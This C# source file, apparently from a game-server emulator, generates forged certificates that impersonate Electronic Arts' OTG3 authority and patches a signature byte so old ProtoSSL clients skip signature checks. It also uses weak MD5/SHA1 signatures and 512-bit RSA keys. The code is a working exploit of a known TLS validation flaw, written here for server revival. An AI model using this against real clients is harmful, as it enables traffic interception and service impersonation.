using System.Collections.Concurrent;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Tls;
using Org.BouncyCastle.Tls.Crypto;
using Org.BouncyCastle.Tls.Crypto.Impl.BC;
using Org.BouncyCastle.Utilities;
using Org.BouncyCastle.X509;
using CustomLogger;
using Org.BouncyCastle.Asn1;
using System.Text;
using Org.BouncyCastle.OpenSsl;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using NetworkLibrary.Extension;
using NetworkLibrary.SSL;

namespace MultiSocks.ProtoSSL;

/// <summary>
/// Based on the following article: https://github.com/Aim4kill/Bug_OldProtoSSL
/// Credits: https://github.com/valters-tomsons/arcadia - https://github.com/a-blondel/mohh2-wii-server
/// </summary>
public class VulnerableCertificateGenerator
{
    private readonly ConcurrentDictionary<string, (AsymmetricKeyParameter, Certificate, X509Certificate2)> _certCache = new();
    private static readonly Dictionary<string, DerObjectIdentifier> RDN_NAME_TO_BC_STYLE = new()
    {
        { "US", X509Name.C },
        { "California", X509Name.ST },
        { "Redwood City", X509Name.L },
        { "Electronic Arts, Inc.", X509Name.O },
        { "Online Technology Group", X509Name.OU }
    };
    private const string SHA1CipherAlgorithm = "SHA1WITHRSA";
    private const string MD5CipherAlgorithm = "MD5WITHRSA";
    private const string IssuerDN = "CN=OTG3 Certificate Authority, C=US, ST=California, L=Redwood City, O=\"Electronic Arts, Inc.\", OU=Online Technology Group";
    private static readonly string OTGRootCACertPath = Program.configDir + "SSL/otg.pem";
    private static readonly string OTGRootCAPrivKeyPath = Program.configDir + "SSL/otg_privatekey.pem";
    private static readonly ReadOnlyMemory<byte> SHA1CipherSignature = new byte[] { 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05 };
    private static readonly ReadOnlyMemory<byte> MD5CipherSignature = new byte[] { 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x04 };

    public (AsymmetricKeyParameter, Certificate, X509Certificate2) GetVulnerableFeslEaCert(bool EnableExploit, bool SHA1 = false)
    {
        string cacheKey = "fesl.ea.com";
        string SubjectDN = $"C=US, ST=California, O=\"Electronic Arts, Inc.\", OU=Online Technology Group, CN={cacheKey}";

        if (_certCache.TryGetValue(cacheKey, out (AsymmetricKeyParameter, Certificate, X509Certificate2) cacheHit))
            // !TODO: New connections will break after running 10 years without a restart 
            return cacheHit;

        (AsymmetricKeyParameter, Certificate, X509Certificate2) creds = GenerateVulnerableCert(IssuerDN, SubjectDN, EnableExploit, SHA1);
        _certCache.TryAdd(cacheKey, creds);
        return creds;
    }

    public (AsymmetricKeyParameter, Certificate, X509Certificate2) GetVulnerableCustomEaCert(string CN, string OU, bool EnableExploit, bool SHA1 = false)
    {
        string SubjectDN = $"C=US, ST=California, O=\"Electronic Arts, Inc.\", OU={OU}, CN={CN}";

        if (_certCache.TryGetValue(CN, out (AsymmetricKeyParameter, Certificate, X509Certificate2) cacheHit))
            // !TODO: New connections will break after running 10 years without a restart 
            return cacheHit;

        (AsymmetricKeyParameter, Certificate, X509Certificate2) creds = GenerateVulnerableCert(IssuerDN, SubjectDN, EnableExploit, SHA1);
        _certCache.TryAdd(CN, creds);
        return creds;
    }

    public (AsymmetricKeyParameter, Certificate, X509Certificate2) GetVulnerableLegacyCustomEaCert(string CN, bool WeakChainSignedRSAKey, bool EnableExploit)
    {
        if (_certCache.TryGetValue(CN, out (AsymmetricKeyParameter, Certificate, X509Certificate2) cacheHit))
            // !TODO: New connections will break after running 10 years without a restart 
            return cacheHit;

        (AsymmetricKeyParameter, Certificate, X509Certificate2) creds = GenerateVulnerableLegacyCert("OTG3 Certificate Authority",
            CN, WeakChainSignedRSAKey, EnableExploit);
        _certCache.TryAdd(CN, creds);
        return creds;
    }

    /// <summary>
    /// Generates a vulnerable certificate for vulnerable ProtoSSL versions.
    /// </summary>
    private static (AsymmetricKeyParameter, Certificate, X509Certificate2) GenerateVulnerableCert(string issuer, string subject, bool EnableExploit, bool SHA1 = false)
    {
        X509CertificateEntry certEntry;
        AsymmetricCipherKeyPair caKeyPair;
        Pkcs12Store store;
        BcTlsCrypto crypto = new(new SecureRandom());
        RsaKeyPairGenerator rsaKeyPairGen = new();
        rsaKeyPairGen.Init(new KeyGenerationParameters(crypto.SecureRandom, 1024));

        AsymmetricCipherKeyPair cKeyPair = rsaKeyPairGen.GenerateKeyPair();

        if (!EnableExploit)
        {
            if (!File.Exists(OTGRootCACertPath))
                throw new Exception($"[ProtoSSL] - GenerateVulnerableCert: OTG Root Certificate was not found on path: {OTGRootCACertPath}");
            else if (!File.Exists(OTGRootCAPrivKeyPath))
                throw new Exception($"[ProtoSSL] - GenerateVulnerableCert: OTG Root Certificate Private Key was not found on path: {OTGRootCAPrivKeyPath}");

            caKeyPair = DotNetUtilities.GetRsaKeyPair(((RSACryptoServiceProvider?)CertificateHelper.LoadCertificate(OTGRootCACertPath, OTGRootCAPrivKeyPath).GetRSAPrivateKey() 
                ?? throw new Exception($"[ProtoSSL] - GenerateVulnerableCert: OTG Root Certificate does not contains a PrivateKey!")).ExportParameters(true));

            store = new Pkcs12StoreBuilder().Build();
            certEntry = new(GenerateCertificate(SHA1 ? SHA1CipherAlgorithm : MD5CipherAlgorithm, subject,
            cKeyPair, caKeyPair.Private, GenerateCertificate(SHA1 ? SHA1CipherAlgorithm : MD5CipherAlgorithm, issuer, caKeyPair, caKeyPair.Private)));

            string certDomain = subject.Split("CN=")[1].Split(",")[0];

            LoggerAccessor.LogDebug("[ProtoSSL] - Certificate generated for: {domain}", certDomain);

            store.SetCertificateEntry(certDomain, certEntry);
            store.SetKeyEntry(certDomain, new AsymmetricKeyEntry(cKeyPair.Private), new[] { certEntry });

            return (cKeyPair.Private, new Certificate(new TlsCertificate[] { new BcTlsCertificate(crypto, certEntry.Certificate.GetEncoded()) }),
                WritePEMPairToX509Certificate2(WriteObjectToPEM(certEntry.Certificate), WriteObjectToPEM(cKeyPair.Private)));
        }
        else
        {
            caKeyPair = rsaKeyPairGen.GenerateKeyPair();

            store = new Pkcs12StoreBuilder().Build();
            certEntry = new(PatchCertificateSignaturePattern(GenerateCertificate(SHA1 ? SHA1CipherAlgorithm : MD5CipherAlgorithm, subject,
            cKeyPair, caKeyPair.Private, GenerateCertificate(SHA1 ? SHA1CipherAlgorithm : MD5CipherAlgorithm, issuer, caKeyPair, caKeyPair.Private)), !SHA1));

            string certDomain = subject.Split("CN=")[1].Split(",")[0];

            LoggerAccessor.LogDebug("[ProtoSSL] - Certificate generated for: {domain}", certDomain);

            store.SetCertificateEntry(certDomain, certEntry);
            store.SetKeyEntry(certDomain, new AsymmetricKeyEntry(cKeyPair.Private), new[] { certEntry });

            return (cKeyPair.Private, new Certificate(new TlsCertificate[] { new BcTlsCertificate(crypto, certEntry.Certificate.GetEncoded()) }),
                WritePEMPairToX509Certificate2(WriteObjectToPEM(certEntry.Certificate), WriteObjectToPEM(cKeyPair.Private)));
        }
    }

    /// <summary>
    /// Generates a vulnerable certificate for vulnerable ProtoSSL versions.
    /// </summary>
    private static (AsymmetricKeyParameter, Certificate, X509Certificate2) GenerateVulnerableLegacyCert(string RootCN, string ChainCN, bool WeakChainSignedRSAKey, bool EnableExploit)
    {
        X509CertificateEntry certEntry;
        AsymmetricCipherKeyPair caKeyPair;
        Pkcs12Store store;
        BcTlsCrypto crypto = new(new SecureRandom());
        RsaKeyPairGenerator rsaKeyPairGen = new();
        rsaKeyPairGen.Init(new KeyGenerationParameters(crypto.SecureRandom, WeakChainSignedRSAKey ? 512 : 1024));

        AsymmetricCipherKeyPair cKeyPair = rsaKeyPairGen.GenerateKeyPair();

        if (!EnableExploit)
        {
            if (!File.Exists(OTGRootCACertPath))
                throw new Exception($"[ProtoSSL] - GenerateVulnerableLegacyCert: OTG Root Certificate was not found on path: {OTGRootCACertPath}");
            else if (!File.Exists(OTGRootCAPrivKeyPath))
                throw new Exception($"[ProtoSSL] - GenerateVulnerableLegacyCert: OTG Root Certificate Private Key was not found on path: {OTGRootCAPrivKeyPath}");

            caKeyPair = DotNetUtilities.GetRsaKeyPair(((RSACryptoServiceProvider?)CertificateHelper.LoadCertificate(OTGRootCACertPath, OTGRootCAPrivKeyPath).GetRSAPrivateKey()
                ?? throw new Exception($"[ProtoSSL] - GenerateVulnerableLegacyCert: OTG Root Certificate does not contains a PrivateKey!")).ExportParameters(true));

            store = new Pkcs12StoreBuilder().Build();
            certEntry = new(GenerateLegacyCertificate(MD5CipherAlgorithm, ChainCN,
                cKeyPair, caKeyPair.Private, GenerateLegacyCertificate(MD5CipherAlgorithm, RootCN, caKeyPair, caKeyPair.Private)));

            LoggerAccessor.LogDebug("[ProtoSSL] - Legacy Certificate generated for: {domain}", ChainCN);

            store.SetCertificateEntry(ChainCN, certEntry);
            store.SetKeyEntry(ChainCN, new AsymmetricKeyEntry(cKeyPair.Private), new[] { certEntry });

            return (cKeyPair.Private, new Certificate(new TlsCertificate[] { new BcTlsCertificate(crypto, certEntry.Certificate.GetEncoded()) }),
                WritePEMPairToX509Certificate2(WriteObjectToPEM(certEntry.Certificate), WriteObjectToPEM(cKeyPair.Private)));
        }
        else
        {
            caKeyPair = rsaKeyPairGen.GenerateKeyPair();

            store = new Pkcs12StoreBuilder().Build();
            certEntry = new(PatchCertificateSignaturePattern(GenerateLegacyCertificate(MD5CipherAlgorithm, ChainCN,
                cKeyPair, caKeyPair.Private, GenerateLegacyCertificate(MD5CipherAlgorithm, RootCN, caKeyPair, caKeyPair.Private)), true));

            LoggerAccessor.LogDebug("[ProtoSSL] - Legacy Certificate generated for: {domain}", ChainCN);

            store.SetCertificateEntry(ChainCN, certEntry);
            store.SetKeyEntry(ChainCN, new AsymmetricKeyEntry(cKeyPair.Private), new[] { certEntry });

            return (cKeyPair.Private, new Certificate(new TlsCertificate[] { new BcTlsCertificate(crypto, certEntry.Certificate.GetEncoded()) }),
                WritePEMPairToX509Certificate2(WriteObjectToPEM(certEntry.Certificate), WriteObjectToPEM(cKeyPair.Private)));
        }
    }

    private static Org.BouncyCastle.X509.X509Certificate GenerateCertificate(string CipherAlgorithm, string subjectName, AsymmetricCipherKeyPair subjectKeyPair, AsymmetricKeyParameter issuerPrivKey, Org.BouncyCastle.X509.X509Certificate? issuerCert = null)
    {
        X509V3CertificateGenerator certGen = new();
        certGen.SetSerialNumber(BigIntegers.CreateRandomInRange(BigInteger.One, BigInteger.ValueOf(long.MaxValue), new SecureRandom()));
        certGen.SetIssuerDN(issuerCert == null ? new X509Name(subjectName) : issuerCert.SubjectDN);
        certGen.SetNotBefore(DateTime.UtcNow.Date);
        certGen.SetNotAfter(DateTime.UtcNow.Date.AddYears(10));
        certGen.SetSubjectDN(new X509Name(subjectName));
        certGen.SetPublicKey(subjectKeyPair.Public);
        return certGen.Generate(new Asn1SignatureFactory(CipherAlgorithm, issuerPrivKey));
    }

    private static Org.BouncyCastle.X509.X509Certificate GenerateLegacyCertificate(string CipherAlgorithm, string CN, AsymmetricCipherKeyPair subjectKeyPair, AsymmetricKeyParameter issuerPrivKey, Org.BouncyCastle.X509.X509Certificate? issuerCert = null)
    {
        X509V3CertificateGenerator certGen = new();
        certGen.SetSerialNumber(BigIntegers.CreateRandomInRange(BigInteger.One, BigInteger.ValueOf(long.MaxValue), new SecureRandom()));
        certGen.SetIssuerDN(issuerCert == null ? BuildX509Name(CN) : issuerCert.SubjectDN);
        certGen.SetNotBefore(new DateTime(2011, 08, 11));
        certGen.SetNotAfter(new DateTime(2011, 08, 11)); // No choice, ProtoSSL cannot handle years after 2050 (client bug).
        certGen.SetSubjectDN(BuildX509Name(CN));
        certGen.SetPublicKey(subjectKeyPair.Public);
        return certGen.Generate(new Asn1SignatureFactory(CipherAlgorithm, issuerPrivKey));
    }

    private static Org.BouncyCastle.X509.X509Certificate PatchCertificateSignaturePattern(Org.BouncyCastle.X509.X509Certificate cCertificate, bool MD5Mode = false)
    {
        byte[] certDer = DotNetUtilities.ToX509Certificate(cCertificate).GetRawCertData();

        // There must be two signatures in the DER encoded certificate
        int signature1Offset = ByteUtils.FindBytePattern(certDer, MD5Mode ? MD5CipherSignature.Span : SHA1CipherSignature.Span);
        int signature2Offset = ByteUtils.FindBytePattern(certDer, MD5Mode ? MD5CipherSignature.Span : SHA1CipherSignature.Span, signature1Offset + (MD5Mode ? MD5CipherSignature.Length : SHA1CipherSignature.Length));

        if (signature1Offset == -1 || signature2Offset == -1)
            throw new Exception("[ProtoSSL] - Failed to find valid signature for patching!");

        // Patch the second signature to TLS_NULL_WITH_NULL_NULL
        certDer[signature2Offset + 8] = 0x01;

        using MemoryStream derStream = new(certDer);
        return new X509CertificateParser().ReadCertificate(derStream);
    }

    private static X509Name BuildX509Name(string CN)
    {
        // build name attributes
        List<DerObjectIdentifier> nameOids = new();
        List<string> nameValues = new();

        foreach (KeyValuePair<string, DerObjectIdentifier> props in RDN_NAME_TO_BC_STYLE)
        {
            nameOids.Add(props.Value);
            nameValues.Add(props.Key);
        }

        nameOids.Add(X509Name.CN);
        nameValues.Add(CN);

        return new X509Name(nameOids, nameValues);
    }

    private static string WriteObjectToPEM(object obj)
    {
        StringBuilder CertPem = new StringBuilder();
        using (PemWriter CSRPemWriter = new PemWriter(new StringWriter(CertPem)))
        {
            CSRPemWriter.WriteObject(obj);
            CSRPemWriter.Writer.Flush();
        }
        return CertPem.ToString();
    }

    private static X509Certificate2 WritePEMPairToX509Certificate2(string certPem, string privKeyPem)
    {
        X509Certificate2Collection coll = new X509Certificate2Collection();
        coll.ImportFromPem(certPem);

        if (coll.Count == 0)
            throw new InvalidOperationException("[ProtoSSL] - No certificates found in the provided PEM.");

        // Detect private key type by PEM header
        if (privKeyPem.Contains("BEGIN RSA PRIVATE KEY"))
        {
            using (RSA rsa = RSA.Create())
            {
                rsa.ImportFromPem(privKeyPem);
                return coll[0].CopyWithPrivateKey(rsa);
            }
        }
        else if (privKeyPem.Contains("BEGIN EC PRIVATE KEY") || privKeyPem.Contains("BEGIN PRIVATE KEY"))
        {
            using (ECDsa ecdsa = ECDsa.Create())
            {
                ecdsa.ImportFromPem(privKeyPem);
                return coll[0].CopyWithPrivateKey(ecdsa);
            }
        }
        else
            throw new NotSupportedException("[ProtoSSL] - Unsupported private key type in PEM.");
    }
}